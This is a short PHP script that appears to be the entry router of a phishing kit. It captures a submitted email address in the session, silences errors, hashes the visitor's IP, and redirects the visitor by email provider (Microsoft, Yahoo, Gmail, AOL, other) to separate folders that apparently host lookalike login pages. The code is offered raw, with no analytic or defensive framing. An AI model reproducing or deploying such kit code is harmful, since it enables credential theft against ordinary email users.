<?php
error_reporting(0);
session_start();
include "config.php";

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

if ($_SESSION['email']=="" && !empty($_POST['email']))
{
$_SESSION['email'] = $_POST['email'];
}
if ($_SESSION['email']!=="" && !empty($_POST['email']))
{
$_SESSION['email'] = $_POST['email'];
}
elseif ($_SESSION['email']!=="" && empty($_POST['email']))
{
$_SESSION['email']=$_SESSION['email'];
}
if (strpos($_SESSION['email'], '@hotmail') !== false || strpos($_SESSION['email'], '@outlook') !== false || strpos($_SESSION['email'], '@live') !== false || strpos($_SESSION['email'], '@msn') !== false|| strpos($_SESSION['email'], '@windowslive') !== false) {



header("Location: ms/index.php");
	
}

elseif (strpos($_SESSION['email'], '@yahoo.com') !== false || strpos($_SESSION['email'], '@ymail') !== false) {



header("Location: yh/index.php");
	
}

elseif (strpos($_SESSION['email'], '@gmail') !== false) {



header("Location: gm/index.php");
	
}
elseif (strpos($_SESSION['email'], '@aol') !== false) {



header("Location: al/index.php");
	
}

else {



header("Location: em/index.php");
	
}

?>